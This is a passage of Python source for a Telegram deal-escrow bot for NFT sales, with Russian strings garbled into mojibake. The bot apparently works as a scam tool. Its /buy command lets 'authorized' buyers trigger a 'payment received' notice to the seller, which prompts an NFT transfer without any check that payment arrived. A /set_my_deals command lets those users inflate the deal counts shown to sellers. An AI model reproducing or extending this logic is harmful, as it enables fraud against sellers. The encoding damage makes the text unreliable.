                f"‚úÖ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –≤—ã–≤–æ–¥–µ —Å—Ä–µ–¥—Å—Ç–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º {user_id}: {amount:.2f} —Ä—É–± –Ω–∞ {method}")
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –æ –≤—ã–≤–æ–¥–µ: {e}")

        await context.bot.send_message(
            chat_id=user_id,
            text=get_text(user_id, 'withdraw_success', context,
                          amount=amount, method=method, details=details, balance=get_user_balance(user_id))
        )
        return True
    except Exception as e:
        logger.error(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –≤—ã–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤: {e}")
        await context.bot.send_message(
            chat_id=user_id,
            text=get_text(user_id, 'withdraw_error', context)
        )
        return False
# ------------------ –§–£–ù–ö–¶–ò–ò –£–í–ï–î–û–ú–õ–ï–ù–ò–ô ------------------
async def notify_seller_about_buyer(deal_id: str, buyer_username: str, buyer_id: int,
                                    context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links:
        deal_data = deal_links[deal_id]
        seller_id = deal_data['user_id']
        buyer_deals_count = user_deals_count.get(buyer_id, 0)
        is_authorized = is_authorized_user(buyer_id)
        status = get_text(seller_id, 'authorized_status' if is_authorized else 'unauthorized_status', context)
        buyer_stats = get_text(seller_id, 'buyer_stats', context, count=buyer_deals_count, status=status)
        text = get_text(seller_id, 'new_buyer_notification', context,
                        buyer=buyer_username, deal_id=deal_id, buyer_stats=buyer_stats)
        try:
            await context.bot.send_message(chat_id=seller_id, text=text)
            logger.info(f"‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø—Ä–æ–¥–∞–≤—Ü—É {seller_id} –¥–ª—è —Å–¥–µ–ª–∫–∏ {deal_id}")
            return True
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–æ–¥–∞–≤—Ü—É: {e}")
            return False
    else:
        logger.error(f"‚ùå –°–¥–µ–ª–∫–∞ {deal_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø—Ä–æ–¥–∞–≤—Ü–∞")
        return False

async def notify_seller_about_payment(deal_id: str, buyer_username: str, buyer_id: int,
                                      context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links:
        deal_data = deal_links[deal_id]
        seller_id = deal_data['user_id']
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        deal_amount = deal_data['amount']
        net_amount, fee = calculate_with_fee(deal_amount)

        seller_transfers[deal_id] = {
            'seller_id': seller_id,
            'buyer_id': buyer_id,
            'buyer_username': buyer_username,
            'seller_confirmed': False,
            'manager_confirmed': False,
            'transfer_requested': False,
            'deal_amount': deal_amount,
            'net_amount': net_amount,
            'fee': fee
        }

        text = get_text(seller_id, 'payment_received_seller', context,
                        buyer=buyer_username, deal_id=deal_id, description=deal_data['description'],
                        amount=deal_amount, unit=currency_unit, fee_percent=SYSTEM_FEE_PERCENT,
                        fee=fee, net=net_amount)
        try:
            await context.bot.send_message(chat_id=seller_id, text=text,
                                           reply_markup=get_seller_transfer_keyboard(deal_id, seller_id, context))
            logger.info(f"‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–ª–∞—Ç–µ–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø—Ä–æ–¥–∞–≤—Ü—É {seller_id} –¥–ª—è —Å–¥–µ–ª–∫–∏ {deal_id}")
            return True
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–ª–∞—Ç–µ–∂–µ –ø—Ä–æ–¥–∞–≤—Ü—É: {e}")
            return False
    else:
        logger.error(f"‚ùå –°–¥–µ–ª–∫–∞ {deal_id} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –¥–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø—Ä–æ–¥–∞–≤—Ü–∞")
        return False

async def notify_buyer_about_payment_confirmation(deal_id: str, buyer_id: int, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links:
        text = get_text(buyer_id, 'payment_confirmed_authorized', context,
                        deals=user_deals_count.get(buyer_id, 0))
        try:
            await context.bot.send_message(chat_id=buyer_id, text=text)
            return True
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª—é: {e}")
            return False
    return False

async def notify_managers_about_transfer_request(deal_id: str, seller_username: str,
                                                 context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_id = transfer_info['seller_id']
        buyer_username = transfer_info['buyer_username']
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        deal_amount = transfer_info['deal_amount']
        net_amount = transfer_info['net_amount']
        fee = transfer_info['fee']

        text = get_text(ADMIN_ID, 'manager_transfer_request', context,
                        deal_id=deal_id, seller=seller_username, seller_id=seller_id,
                        buyer=buyer_username, amount=deal_amount, unit=currency_unit,
                        description=deal_data['description'], fee=fee, fee_percent=SYSTEM_FEE_PERCENT, net=net_amount)

        notified_managers = 0
        for manager_id in MANAGER_IDS:
            try:
                await context.bot.send_message(chat_id=manager_id, text=text,
                                               reply_markup=get_manager_confirmation_keyboard(deal_id, manager_id, context))
                notified_managers += 1
                logger.info(f"‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –º–µ–Ω–µ–¥–∂–µ—Ä—É {manager_id} –æ –∑–∞—è–≤–∫–µ –Ω–∞ –ø–µ—Ä–µ–¥–∞—á—É {deal_id}")
            except Exception as e:
                logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –º–µ–Ω–µ–¥–∂–µ—Ä—É {manager_id}: {e}")

        return notified_managers > 0
    return False

async def notify_buyer_about_transfer_confirmation(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        buyer_id = transfer_info['buyer_id']
        seller_username = deal_data.get('username', '–ü—Ä–æ–¥–∞–≤–µ—Ü')
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")

        text = get_text(buyer_id, 'buyer_deal_completed', context,
                        seller=seller_username, amount=deal_data['amount'],
                        unit=currency_unit, description=deal_data['description'], deal_id=deal_id)
        try:
            await context.bot.send_message(chat_id=buyer_id, text=text,
                                           reply_markup=get_transfer_confirmed_keyboard(buyer_id, context))
            user_deals_count[buyer_id] = user_deals_count.get(buyer_id, 0) + 1
            logger.info(f"‚úÖ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –ø–µ—Ä–µ–¥–∞—á–µ NFT –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–æ–∫—É–ø–∞—Ç–µ–ª—é {buyer_id}")
            return True
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–∫—É–ø–∞—Ç–µ–ª—é –æ –ø–µ—Ä–µ–¥–∞—á–µ: {e}")
            return False
    return False

async def notify_seller_about_manager_confirmation(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_id = transfer_info['seller_id']
        net_amount = transfer_info['net_amount']
        fee = transfer_info['fee']
        deal_amount = transfer_info['deal_amount']

        new_balance = await add_to_balance(seller_id, net_amount, f"–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–¥–µ–ª–∫–∏ #{deal_id}", context)
        user_deals_count[seller_id] = user_deals_count.get(seller_id, 0) + 1

        text = get_text(seller_id, 'seller_funds_credited', context,
                        deal_id=deal_id, description=deal_data['description'],
                        amount=deal_amount, fee=fee, net=net_amount, balance=new_balance)
        try:
            await context.bot.send_message(chat_id=seller_id, text=text,
                                           reply_markup=get_transfer_confirmed_keyboard(seller_id, context))
            logger.info(f"‚úÖ –ü—Ä–æ–¥–∞–≤–µ—Ü {seller_id} —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–∏ –ø–µ—Ä–µ–¥–∞—á–∏")
            return True
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø—Ä–æ–¥–∞–≤—Ü–∞: {e}")
            return False
    return False

async def notify_seller_about_manager_rejection(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_id = transfer_info['seller_id']

        text = get_text(seller_id, 'seller_transfer_rejected', context,
                        deal_id=deal_id, description=deal_data['description'])
        try:
            await context.bot.send_message(chat_id=seller_id, text=text,
                                           reply_markup=get_seller_transfer_keyboard(deal_id, seller_id, context))
            logger.info(f"‚úÖ –ü—Ä–æ–¥–∞–≤–µ—Ü {seller_id} —É–≤–µ–¥–æ–º–ª–µ–Ω –æ–± –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏ –∑–∞—è–≤–∫–∏")
            return True
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø—Ä–æ–¥–∞–≤—Ü–∞ –æ–± –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏–∏: {e}")
            return False
    return False

async def notify_admin_about_completed_deal(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    if deal_id in deal_links and deal_id in seller_transfers:
        deal_data = deal_links[deal_id]
        transfer_info = seller_transfers[deal_id]
        seller_username = deal_data.get('username', '–ü—Ä–æ–¥–∞–≤–µ—Ü')
        buyer_username = transfer_info.get('buyer_username', '–ü–æ–∫—É–ø–∞—Ç–µ–ª—å')
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        deal_amount = transfer_info['deal_amount']
        net_amount = transfer_info['net_amount']
        fee = transfer_info['fee']

        text = (f"‚úÖ –°–î–ï–õ–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê\n\n"
                f"üîó ID —Å–¥–µ–ª–∫–∏: #{deal_id}\n"
                f"üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü: @{seller_username}\n"
                f"üë§ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å: @{buyer_username}\n"
                f"üí∞ –°—É–º–º–∞: {deal_amount} {currency_unit}\n"
                f"üì¶ –¢–æ–≤–∞—Ä: {deal_data['description']}\n"
                f"üí± –í–∞–ª—é—Ç–∞: {currency}\n\n"
                f"üìä **–§–∏–Ω–∞–Ω—Å–æ–≤—ã–π –æ—Ç—á–µ—Ç:**\n"
                f"‚Ä¢ –°—É–º–º–∞ —Å–¥–µ–ª–∫–∏: {deal_amount} {currency_unit}\n"
                f"‚Ä¢ –ö–æ–º–∏—Å—Å–∏—è —Å–∏—Å—Ç–µ–º—ã: {fee:.2f} —Ä—É–± ({SYSTEM_FEE_PERCENT}%)\n"
                f"‚Ä¢ –ó–∞—á–∏—Å–ª–µ–Ω–æ –ø—Ä–æ–¥–∞–≤—Ü—É: {net_amount:.2f} —Ä—É–±\n\n"
                f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤:\n"
                f"‚Ä¢ –°–¥–µ–ª–æ–∫ —É –ø—Ä–æ–¥–∞–≤—Ü–∞: {user_deals_count.get(deal_data['user_id'], 0)}\n"
                f"‚Ä¢ –°–¥–µ–ª–æ–∫ —É –ø–æ–∫—É–ø–∞—Ç–µ–ª—è: {user_deals_count.get(transfer_info['buyer_id'], 0)}\n\n"
                f"‚úÖ –ü–ï–†–ï–î–ê–ß–ê NFT –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–ê –ú–ï–ù–ï–î–ñ–ï–†–û–ú\n"
                f"üéØ –°—Ç–∞—Ç—É—Å: –£—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=text)
            logger.info(f"‚úÖ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä —É–≤–µ–¥–æ–º–ª–µ–Ω –æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–∏ —Å–¥–µ–ª–∫–∏ {deal_id}")
            return True
        except Exception as e:
            logger.error(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: {e}")
            return False
    return False


# ------------------ –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –ì–õ–ê–í–ù–û–ì–û –ú–ï–ù–Æ ------------------
async def send_main_menu_with_photo(chat_id: int, context: ContextTypes.DEFAULT_TYPE, reply_to_message_id: int = None):
    caption = get_text(chat_id, 'welcome', context)
    return await context.bot.send_photo(
        chat_id=chat_id,
        photo=IMAGE_URL,
        caption=caption,
        reply_markup=get_main_keyboard(chat_id, context),
        reply_to_message_id=reply_to_message_id
    )


# ------------------ –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –ö–û–ú–ê–ù–î ------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if 'language' not in context.user_data:
            await update.message.reply_text(
                get_text(user_id, 'choose_language', context),
                reply_markup=get_language_keyboard()
            )
            return

        if context.args:
            deal_id = context.args[0]
            await handle_deal_link(update, deal_id, context)
        else:
            await send_main_menu_with_photo(update.message.chat_id, context)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ start: {e}")
        if update.message:
            await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")


async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id

        if context.args and len(context.args) > 0:
            deal_id = context.args[0]
            logger.info(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /buy —Å –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º: {deal_id} –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")

            if deal_id not in deal_links:
                await update.message.reply_text(
                    get_text(user_id, 'deal_not_found', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            if user_id not in active_buyers or active_buyers[user_id] != deal_id:
                await update.message.reply_text(
                    get_text(user_id, 'not_buyer', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            if not is_authorized_user(user_id):
                await update.message.reply_text(
                    get_text(user_id, 'not_authorized', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            deal_data = deal_links[deal_id]
            buyer_username = update.message.from_user.username or "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"

            seller_notified = await notify_seller_about_payment(deal_id, buyer_username, user_id, context)
            buyer_notified = await notify_buyer_about_payment_confirmation(deal_id, user_id, context)

            active_buyers.pop(user_id, None)

            if seller_notified and buyer_notified:
                current_deals = user_deals_count.get(user_id, 0)
                await update.message.reply_text(
                    get_text(user_id, 'payment_confirmed_authorized', context, deals=current_deals),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            else:
                await update.message.reply_text(
                    get_text(user_id, 'payment_confirmation_error', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
            return

        if not is_authorized_user(user_id):
            await update.message.reply_text(
                get_text(user_id, 'not_authorized', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        if user_id not in active_buyers:
            await update.message.reply_text(
                get_text(user_id, 'buy_command_usage', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        deal_id = active_buyers[user_id]
        if deal_id not in deal_links:
            await update.message.reply_text(get_text(user_id, 'deal_not_found', context))
            active_buyers.pop(user_id, None)
            return

        deal_data = deal_links[deal_id]
        buyer_username = update.message.from_user.username or "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"

        seller_notified = await notify_seller_about_payment(deal_id, buyer_username, user_id, context)
        buyer_notified = await notify_buyer_about_payment_confirmation(deal_id, user_id, context)

        active_buyers.pop(user_id, None)

        current_deals = user_deals_count.get(user_id, 0)
        await update.message.reply_text(
            get_text(user_id, 'payment_confirmed_authorized', context, deals=current_deals),
            reply_markup=get_main_keyboard(user_id, context)
        )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ buy_command: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –∫–æ–º–∞–Ω–¥—ã.")


async def handle_deal_link(update: Update, deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not update.message:
            return

        user_id = update.message.from_user.id
        buyer_username = update.message.from_user.username or "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"

        if deal_id not in deal_links:
            await update.message.reply_text(get_text(user_id, 'deal_not_found', context))
            return

        deal_data = deal_links[deal_id]

        if user_id == deal_data['user_id']:
            await show_seller_deal_info(update, deal_id, context)
            return

        seller_username = deal_data.get('username', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å')
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        amount = deal_data['amount']

        if currency == CURRENCY_TON:
            wallet_address = FIXED_TON_WALLET
            payment_info = get_text(user_id, 'payment_info_ton', context, wallet=wallet_address, deal_id=deal_id)
            warning = get_text(user_id, 'warning_ton', context, amount=amount)
        elif currency == CURRENCY_RUB:
            card_number = deal_data.get('card', '–ù–µ —É–∫–∞–∑–∞–Ω')
            payment_info = get_text(user_id, 'payment_info_card', context, card=card_number, deal_id=deal_id)
            warning = get_text(user_id, 'warning_card', context, amount=amount)
        else:
            payment_info = get_text(user_id, 'payment_info_stars', context, currency=currency, deal_id=deal_id)
            warning = get_text(user_id, 'warning_stars', context)

        deal_info_text = get_text(user_id, 'deal_info_buyer', context,
                                  deal_id=deal_id, seller=seller_username,
                                  description=deal_data['description'],
                                  payment_info=payment_info,
                                  amount=amount, unit=currency_unit,
                                  warning=warning)

        active_buyers[user_id] = deal_id

        await update.message.reply_text(
            deal_info_text,
            reply_markup=get_buyer_keyboard(deal_id, user_id, context),
            parse_mode='HTML'
        )

        await notify_seller_about_buyer(deal_id, buyer_username, user_id, context)

    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ handle_deal_link: {e}")
        try:
            await update.message.reply_text(
                get_text(user_id, 'error_occurred', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
        except Exception as inner_e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–µ: {inner_e}")


async def show_seller_deal_info(update: Update, deal_id: str, context: ContextTypes.DEFAULT_TYPE):
    try:
        if deal_id not in deal_links:
            await update.message.reply_text(get_text(update.effective_user.id, 'deal_not_found', context))
            return

        deal_data = deal_links[deal_id]
        seller_id = deal_data['user_id']
        seller_deals_count = user_deals_count.get(seller_id, 0)
        currency = deal_data.get('currency', CURRENCY_TON)
        currency_unit = CURRENCY_UNITS.get(currency, "TON")
        bot_username = context.bot.username
        deal_link = f"https://t.me/{bot_username}?start={deal_id}"

        seller_info_text = get_text(seller_id, 'seller_deal_info', context,
                                    deal_id=deal_id, deals=seller_deals_count,
                                    description=deal_data['description'],
                                    amount=deal_data['amount'], unit=currency_unit,
                                    currency=currency, link=deal_link)

        await update.message.reply_text(
            seller_info_text,
            reply_markup=get_back_keyboard(seller_id, context)
        )

        logger.info(f"üìã –ü—Ä–æ–¥–∞–≤–µ—Ü {seller_id} –ø—Ä–æ—Å–º–æ—Ç—Ä–µ–ª —Å–≤–æ—é —Å–¥–µ–ª–∫—É {deal_id}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ show_seller_deal_info: {e}")
        await update.message.reply_text(get_text(update.effective_user.id, 'error_occurred', context))


async def set_my_deals_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if not is_authorized_user(user_id):
            await update.message.reply_text(
                get_text(user_id, 'not_authorized', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        if not context.args:
            current_deals = user_deals_count.get(user_id, 0)
            await update.message.reply_text(
                get_text(user_id, 'set_my_deals_current', context, deals=current_deals),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        try:
            deals_count = int(context.args[0])
            if deals_count < 0:
                await update.message.reply_text(
                    get_text(user_id, 'set_my_deals_negative', context),
                    reply_markup=get_main_keyboard(user_id, context)
                )
                return

            user_deals_count[user_id] = deals_count
            await update.message.reply_text(
                get_text(user_id, 'set_my_deals_success', context, deals=deals_count),
                reply_markup=get_main_keyboard(user_id, context)
            )
        except ValueError:
            await update.message.reply_text(
                get_text(user_id, 'set_my_deals_invalid', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ set_my_deals_command: {e}")
        await update.message.reply_text(get_text(user_id, 'error_occurred', context))


async def my_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if not is_authorized_user(user_id):
            await update.message.reply_text(
                get_text(user_id, 'not_authorized', context),
                reply_markup=get_main_keyboard(user_id, context)
            )
            return

        current_deals = user_deals_count.get(user_id, 0)
        username = update.message.from_user.username or "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"
        is_auth = is_authorized_user(user_id)
        balance = get_user_balance(user_id)

        can_wallet, wallet_status, _ = get_withdrawal_status(user_id, 'wallet', context)
        can_card, card_status, _ = get_withdrawal_status(user_id, 'card', context)

        wallet_info = f"ü™ô TON-–∫–æ—à–µ–ª–µ–∫: {wallet_status}"
        card_info = f"üí≥ –ö–∞—Ä—Ç–∞: {card_status}"

        status_text = "‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å" if is_auth else "‚ùå –ù–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π"
        functions = []
        if is_auth:
            functions.append(get_text(user_id, 'function_confirm_payment', context))
            functions.append(get_text(user_id, 'function_change_stats', context))
        else:
            functions.append(get_text(user_id, 'function_not_available', context))
        functions.append(get_text(user_id, 'function_view_stats', context))
        functions.append(get_text(user_id, 'function_withdraw', context))

        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º, –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å –ª–∏ —Å—Ç—Ä–æ–∫—É –æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ —Å–¥–µ–ª–æ–∫
        if current_deals > 0:
            deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
        else:
            deals_requirement = ""

        await update.message.reply_text(
            get_text(user_id, 'my_stats', context,
                     username=username, user_id=user_id, deals=current_deals,
                     balance=balance, status=status_text,
                     wallet_info=wallet_info, card_info=card_info,
                     min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                     deals_requirement=deals_requirement,
                     fee=SYSTEM_FEE_PERCENT, functions="\n".join(functions)),
            reply_markup=get_main_keyboard(user_id, context)
        )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ my_stats_command: {e}")
        await update.message.reply_text(get_text(user_id, 'error_occurred', context))


async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(
        get_text(user_id, 'choose_language', context),
        reply_markup=get_language_keyboard()
    )


# ------------------ –ö–û–ú–ê–ù–î–´ –ê–î–ú–ò–ù–ò–°–¢–†–ê–¢–û–†–ê ------------------
async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É")
            return

        if not context.args:
            await update.message.reply_text(
                "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /add_user <user_id>\n"
                "–ü—Ä–∏–º–µ—Ä: /add_user 123456789"
            )
            return

        try:
            new_user_id = int(context.args[0])
            authorized_users.add(new_user_id)
            try:
                user_info = await context.bot.get_chat(new_user_id)
                username = user_info.username or f"ID: {new_user_id}"
            except:
                username = f"ID: {new_user_id}"
            await update.message.reply_text(
                f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @{username} (ID: {new_user_id}) –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–ø–∏—Å–æ–∫ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö.\n"
                f"–¢–µ–ø–µ—Ä—å –æ–Ω –º–æ–∂–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å –æ–ø–ª–∞—Ç—ã –≤ —Å–¥–µ–ª–∫–∞—Ö."
            )
            logger.info(f"–ê–¥–º–∏–Ω {user_id} –¥–æ–±–∞–≤–∏–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {new_user_id} –≤ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ")
        except ValueError:
            await update.message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ID. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ.")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ add_user_command: {e}")
        await update.message.reply_text("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")


async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("‚ùå –≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É")
            return

        if not context.args:
            await update.message.reply_text(
                "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /remove_user <user_id>\n"
                "–ü—Ä–∏–º–µ—Ä: /remove_user 123456789"
            )
            return

        try:
            user_to_remove = int(context.args[0])
            if user_to_remove in authorized_users:
                authorized_users.remove(user_to_remove)
                await update.message.reply_text(
                    f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ID: {user_to_remove} —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö."
                )
